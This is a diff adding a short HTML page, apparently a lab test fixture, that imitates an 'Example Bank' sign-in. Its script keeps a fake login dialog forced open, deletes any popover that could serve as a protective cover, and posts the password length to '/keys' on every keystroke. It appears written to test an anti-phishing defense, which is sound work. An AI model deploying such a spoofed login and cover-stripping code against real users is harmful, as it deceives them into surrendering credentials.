@@ -1,0 +1,17 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Example Bank | Sign in</title>
+<script>
+// Lab: tries to beat the "check every page" cover: draws a fake login in the browser's top layer
+// at once, keeps re-opening it, removes anything that looks like a cover, and sends keystrokes as typed.
+addEventListener("DOMContentLoaded", () => {
+  const d = document.getElementById("login");
+  const show = () => { try { if (d.open) d.close(); d.showModal(); } catch {} };
+  show(); setInterval(show, 300);
+  setInterval(() => document.querySelectorAll("[popover]").forEach(e => { try { e.hidePopover(); } catch {} e.remove(); }), 200);
+  document.getElementById("p").addEventListener("input", e =>
+    fetch("/keys", {method: "POST", body: String(e.target.value.length)}));
+});
+</script>
+<style>dialog{border:0;border-radius:12px;padding:28px;font:16px system-ui;width:320px}
+dialog::backdrop{background:#0b3d91}input{width:100%;box-sizing:border-box;padding:10px;margin:6px 0}</style></head>
+<body><dialog id="login"><h2>Example Bank</h2><p>Sign in to continue</p>
+<input id="u" placeholder="User ID"><input id="p" type="password" placeholder="Password"></dialog></body></html>
